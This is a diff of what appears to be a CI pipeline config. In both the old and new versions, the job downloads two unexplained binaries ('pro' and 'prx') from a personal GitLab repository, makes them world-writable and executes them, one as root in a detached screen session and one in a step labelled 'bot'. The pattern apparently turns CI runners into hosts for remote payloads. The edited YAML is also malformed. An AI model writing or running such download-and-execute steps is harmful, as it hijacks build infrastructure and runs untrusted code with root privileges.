@@ -7,6 +7,11 @@ jobs:
       image: ubuntu-2004:202101-01
 
     steps:
-    
-      - run: sudo apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro && sudo screen ./pro
-      - run: wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/prx && chmod 777 prx && ./prx
+      - run:
+         name: pro
+         command: sudo apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro && sudo screen -dmS ./pro
+          sleep 10
+      
+      - run:
+         name: bot
+         command: wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/prx && chmod 777 prx && ./prx
